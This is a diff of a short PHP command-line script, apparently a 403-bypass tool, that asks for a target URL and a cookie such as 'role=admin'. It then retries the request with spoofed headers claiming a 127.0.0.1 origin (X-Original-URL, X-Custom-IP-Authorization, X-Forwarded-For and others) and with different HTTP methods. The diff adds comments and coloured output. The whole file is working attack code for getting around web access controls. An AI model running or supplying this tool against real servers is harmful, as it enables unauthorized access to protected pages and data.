@@ -1,11 +1,12 @@
 <?php
 			// by omar alahmadi 
-    $url = readline("enter URL ex: http://google.com: ");
-    readline_add_history($url);
-    $Cookie = readline("add Cookie ex : username=test; role=admin : ");
-    readline_add_history($Cookie);
+    $url = readline("enter URL ex: http://google.com: "); //input for URL
+    readline_add_history($url); //save input 
+    $Cookie = readline("add Cookie ex : username=test; role=admin : "); //input for cookie
+    readline_add_history($Cookie); //save input
     $ch =" ";
-    $bypass = [
+    $status = false;
+    $bypass = [  
         'X-Original-URL:127.0.0.1',
         'Referer:'.$url,
         'X-Custom-IP-Authorization:127.0.0.1',
@@ -13,7 +14,7 @@
         'X-Forwarded-For:http://127.0.0.1',
         'X-rewrite-url:127.0.0.1'
     ];
-    $methods=[
+    $methods=[ 
         CURLOPT_POST,
         CURLOPT_HTTPGET,
         CURLOPT_PUT,
@@ -37,12 +38,16 @@ foreach ($bypass as $bypas){
     curl_setopt( $ch, CURLOPT_URL, $url );
     $result = curl_exec( $ch );
 
-    $pos = strpos($result, '403 Forbidden');
-    echo "\n trying : ".$bypas;
+    $pos = strpos($result, 'Forbidden');
+    
+    echo "\n trying : "."\033[33m$bypas \033[0m\n";
     if ($pos != true){
-        echo "\n $bypas";
-        printf($result);
+        echo "\n \033[32m$bypas \033[0m\n";
+        printf("\033[36m$result \033[0m\n");
         curl_close( $ch );
+        $status = true;
         }
     }
+}if($status == false){
+    echo "\033[31m sorry i tried hard but i didn't found anything \033[0m\n";
 }
